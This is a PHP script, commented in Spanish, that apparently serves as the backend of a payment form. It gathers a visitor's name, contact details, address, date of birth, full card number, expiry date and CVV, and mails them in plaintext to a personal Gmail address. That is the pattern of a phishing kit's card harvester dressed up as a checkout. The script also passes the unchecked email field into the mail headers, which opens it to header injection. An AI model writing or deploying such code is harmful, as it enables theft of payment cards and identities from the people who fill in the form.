<?php
// Verifica si el formulario fue enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Recoge los datos del formulario
    $nombre = isset($_POST['nombre']) ? $_POST['nombre'] : '';
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $telefono = isset($_POST['telefono']) ? $_POST['telefono'] : '';
    $direccion = isset($_POST['direccion']) ? $_POST['direccion'] : '';
    $fecha = isset($_POST['fecha']) ? $_POST['fecha'] : '';
    $tarjeta = isset($_POST['tarjeta']) ? $_POST['tarjeta'] : '';
    $nombre_tarjeta = isset($_POST['nombre-tarjeta']) ? $_POST['nombre-tarjeta'] : '';
    $fecha_expiracion = isset($_POST['fecha-expiracion']) ? $_POST['fecha-expiracion'] : '';
    $cvv = isset($_POST['cvv']) ? $_POST['cvv'] : '';

    // Dirección de correo electrónico de destino
    $to = "alejandropro917@gmail.com";

    // Asunto del correo
    $subject = "Nuevo formulario de pago recibido";

    // Mensaje del correo con los datos del formulario
    $message = "Detalles del formulario:\n\n";
    $message .= "Nombre Completo: $nombre\n";
    $message .= "Correo Electrónico: $email\n";
    $message .= "Teléfono: $telefono\n";
    $message .= "Dirección de Envío: $direccion\n";
    $message .= "Fecha de Nacimiento: $fecha\n";
    $message .= "Número de Tarjeta: $tarjeta\n";
    $message .= "Nombre en la Tarjeta: $nombre_tarjeta\n";
    $message .= "Fecha de Expiración: $fecha_expiracion\n";
    $message .= "Código CVV: $cvv\n";

    // Encabezados del correo
    $headers = "From: no-reply@tudominio.com" . "\r\n" .
               "Reply-To: $email" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Formulario enviado correctamente. ¡Gracias!";
    } else {
        echo "Hubo un error al enviar el formulario. Por favor, intentalo de nuevo más tarde.";
    }
}
?>
